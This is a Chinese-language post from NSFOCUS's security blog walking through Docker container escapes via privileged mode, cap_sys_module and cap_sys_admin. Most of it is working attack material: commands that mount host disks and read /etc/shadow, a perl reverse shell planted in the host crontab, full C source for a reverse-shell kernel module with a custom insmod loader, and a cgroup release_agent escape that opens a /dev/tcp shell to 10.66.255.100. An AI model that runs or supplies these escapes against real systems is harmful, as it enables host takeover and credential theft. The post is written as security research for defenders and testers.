---
title: 容器逃逸手法实战-危险配置与挂载篇
url: http://blog.nsfocus.net/docker/
source: 绿盟科技技术博客
date: 2022-12-09
fetch_date: 2025-10-04T01:00:37.217048
---

# 容器逃逸手法实战-危险配置与挂载篇

* [登录](http://blog.nsfocus.net/wp-login.php)
* [注册](http://blog.nsfocus.net/wp-login.php?action=register)

[![Logo](http://blog.nsfocus.net/wp-content/uploads/2020/07/blog-logo.png)](https://blog.nsfocus.net/)

* [技术产品](https://blog.nsfocus.net/category/technology-product/)
* [数智安全](https://blog.nsfocus.net/category/digital-intelligence-secuirty/)
* [威胁通告](https://blog.nsfocus.net/category/threat-alert/)
* [研究调研](https://blog.nsfocus.net/category/security-research/)
* [洞见RSA](https://blog.nsfocus.net/category/rsac/)
* [公益译文](https://blog.nsfocus.net/category/translation/)
* [安全分享](https://blog.nsfocus.net/category/security-sharing/)

[![Logo](http://blog.nsfocus.net/wp-content/uploads/2020/07/blog-logo.png)](https://blog.nsfocus.net/)

* [技术产品](https://blog.nsfocus.net/category/technology-product/)
* [数智安全](https://blog.nsfocus.net/category/digital-intelligence-secuirty/)
* [威胁通告](https://blog.nsfocus.net/category/threat-alert/)
* [研究调研](https://blog.nsfocus.net/category/security-research/)
* [洞见RSA](https://blog.nsfocus.net/category/rsac/)
* [公益译文](https://blog.nsfocus.net/category/translation/)
* [安全分享](https://blog.nsfocus.net/category/security-sharing/)

# 容器逃逸手法实践-危险配置与挂载篇

### 容器逃逸手法实践-危险配置与挂载篇

[2022-12-08](https://blog.nsfocus.net/docker/ "容器逃逸手法实践-危险配置与挂载篇")[刘乾坤](https://blog.nsfocus.net/author/liuqiankun/ "View all posts by 刘乾坤")[容器逃逸](https://blog.nsfocus.net/tag/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/)

阅读： 5,967

随着K8S和Docker在企业的大量部署，业务发布越来越便捷和轻量化，但是同时也导致了容器安全问题的出现。在容器安全领域中容器逃逸是最重要的威胁之一，容器与宿主机之间通过Namespace 和Cgroups进行隔离，但是许多危险操作或者漏洞导致攻击者可以从容器里边逃逸到宿主机上。常用的逃逸手法包含四类：危险配置、危险挂载、组件漏洞、内核漏洞，本篇文章介绍危险配置与挂载导致逃逸的常用手法。

# **一、危险配置**

### **1.1 Privileged特权模式导致容器逃逸**

通过配置–privileged参数可以让docker以特权模式启动，当容器以特权模式启动时，docker容器可以访问主机上的所有设备，且有mount命令挂载权限。因为特权模式权限过大，从而导致了逃逸的风险，一般存在两种手法：挂载/dev、重写devices\_allow，下面分别介绍。

****方法1：特权模式下挂载 /dev****

（1）使用 –privileged=true 创建一个特权容器:

docker run -idt –privileged=true –name privileged\_test\_666 ubuntu:18.04

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_0-300x17.png)

（2）挂载磁盘

进入容器，查看挂载磁盘设备

fdisk -l

将宿主机文件挂载到 /test 目录下

mkdir /test && mount /dev/dm-0 /test

（3）敏感文件访问

尝试访问宿主机 shadow 文件，cat /test/etc/shadow，可以看到正常访问：

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_1-300x37.png)

（4）反弹shell

在定时任务中写入反弹 shell:

echo $’\*/1 \* \* \* \* root perl -e \’use Socket;$i=”10.66.255.100″;$p=7777;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};\” >> /test/etc/crontab

1分钟后攻击端收到宿主机返回的shell：

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_2-300x127.png)

****方法2：特权模式下重写devices\_allow****

（1）创建特权容器：

docker run -idt –name privileged\_device\_allow\_test666 –privileged=true ubuntu:18.04

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_3-300x18.png)

（2）重写devices.allow：

进入容器，寻找容器内的devices.allow文件：find . -name “devices.allow”

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_4-300x24.png)

在该目录下执行 echo a > devices.allow，设置容器允许访问所有类型设备。

（3）查看/etc目录的node号和文件系统类型

cat /proc/self/mountinfo | grep /etc | awk ‘{print $3,$8}’ | head -1

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_5-300x17.png)

（4）创建设备

在根目录下执行 mknod host b 253 0

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_6-300x32.png)

（5）敏感文件读写：

由于是xfs文件系统，先挂载设备： mkdir /tmp/host\_dir && mount host /tmp/host\_dir,然后查看：cat /tmp/host\_dir/etc/shadow

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_7-300x55.png)

若是ext2/ext3/ext4文件系统，通过debugfs -w host进行调试即可读写文件：

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_8-300x32.png)

可见，能够读取到主机上所有文件，逃逸成功！

### **1.****2****cap\_sys\_module导致容器逃逸**

cap\_sys\_module权限允许加载内核模块，如果在容器里加载一个恶意的内核模块，将直接导致逃逸。

* 编译ko文件：

首先写一个反弹shell的内核模块reverse-shell.c，代码如下：

#include <linux/kmod.h>

#include <linux/module.h>

char\* argv[] = {“/bin/bash”,”-c”,”bash -i >& /dev/tcp/10.66.255.100/7777 0>&1″, NULL};

static char\* envp[] = {“PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin”, NULL };

// call\_usermodehelper function is used to create user mode processes from kernel space

static int \_\_init reverse\_shell\_init(void) {

return call\_usermodehelper(argv[0], argv, envp, UMH\_WAIT\_EXEC);

}

static void \_\_exit reverse\_shell\_exit(void) {

printk(KERN\_INFO “Exiting\n”);

}

module\_init(reverse\_shell\_init);

module\_exit(reverse\_shell\_exit);

然后在同级目录下编写一个Makefile文件：

obj-m +=reverse-shell.o

all:

make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:

make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

最后在同级目录下执行make进行编译，最终生成reverse-shell.ko文件：

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_9-300x14.png)

* insmod生成:

由于容器环境中可能没有insmod命令，因此我们可以自己打包一个，代码如下：

#define \_GNU\_SOURCE

#include <fcntl.h>

#include <stdio.h>

#include <sys/stat.h>

#include <sys/syscall.h>

#include <sys/types.h>

#include <unistd.h>

#include <stdlib.h>

#define init\_module(module\_image, len, param\_values) syscall(\_\_NR\_init\_module, module\_image, len, param\_values)

#define finit\_module(fd, param\_values, flags) syscall(\_\_NR\_finit\_module, fd, param\_values, flags)

int main(int argc, char \*\*argv) {

const char \*params;

int fd, use\_finit;

size\_t image\_size;

struct stat st;

void \*image;

/\* CLI handling. \*/

if (argc < 2) {

puts(“Usage ./insmod.o mymodule.ko [args=”” [use\_finit=0]”);

return EXIT\_FAILURE;

}

if (argc < 3) {

params = “”;

} else {

params = argv[2];

}

if (argc < 4) {

use\_finit = 0;

} else {

use\_finit = (argv[3][0] != ‘0’);

}

/\* Action. \*/

fd = open(argv[1], O\_RDONLY);

if (use\_finit) {

puts(“finit”);

if (finit\_module(fd, params, 0) != 0) {

perror(“finit\_module”);

return EXIT\_FAILURE;

}

close(fd);

} else {

puts(“init”);

fstat(fd, &st);

image\_size = st.st\_size;

image = malloc(image\_size);

read(fd, image, image\_size);

close(fd);

if (init\_module(image, image\_size, params) != 0) {

perror(“init\_module”);

return EXIT\_FAILURE;

}

free(image);

}

return EXIT\_SUCCESS;

}

编译之后产生可执行文件insmod.o：gcc insmod.c -o insmod.o

* 创建cap\_sys\_module容器：

docker run -idt –name cap\_sys\_module\_test\_666 –cap-add SYS\_MODULE ubuntu:18.04

然后将reverse-shell.ko和 insmod.o文件传入容器中（实际攻击中通过网络工具下载）：

docker cp reverse-shell.ko e2d8b9128222:/tmp

docker cp insmod.o  e2d8b9128222:/tmp

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_10-300x37.png)

* 反弹shell

运行insmod.o加载内核模块reverse-shell.ko，执行反弹shell：

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_11-300x60.png)

攻击机10.66.255.100收到反弹shell：

**![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_12-300x142.png)**

### **1.****3****cap\_sys\_admin导致容器逃逸**

当拥有cap\_sys\_admin权限时，在容器内可以执行mount操作，从而可以将cgroup挂载进容器，实现逃逸。具体来说，分为两种方法，利用notify-on-release实现逃逸和重写devices.allow实现逃逸。

****方法1：利用notify-on-release实现逃逸****

（1）创建一个启用SYS\_ADMIN Capability权限的容器：

docker run -idt –name notify\_on\_release\_test\_666 –cap-add=SYS\_ADMIN  ubuntu:18.04

注：centos系统不需要配置–security-opt apparmor=unconfined，其他系统需要

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_13-300x24.png)

（2）进入容器，在容器内挂载宿主机cgroup，并自定义一个cgroup：

mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

（3）配置该cgroup的notify\_no\_release和release\_agent：

echo 1 > /tmp/cgrp/x/notify\_on\_release

host\_path=`sed -n ‘s/.\*\perdir=\([^,]\*\).\*/\1/p’ /etc/mtab`

echo “$host\_path/cmd” > /tmp/cgrp/release\_agent

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_14-300x23.png)

其中，cmd为需要宿主机执行的命令，本次使用sh反弹shell：

echo ‘#!/bin/sh’ > /cmd

echo “sh -i >& /dev/tcp/10.66.255.100/7777 0>&1” >> /cmd

chmod a+x /cmd

![](https://blog.nsfocus.net/wp-content/uploads/2022/12/wps_doc_15-300x35.png)

（4）反弹shell

触发release\_agent执行反弹shell，攻击机10.66.255.100收到反弹shell。

sh -c “echo \$\$ > /tmp/cgrp/x/cgroup.procs”

...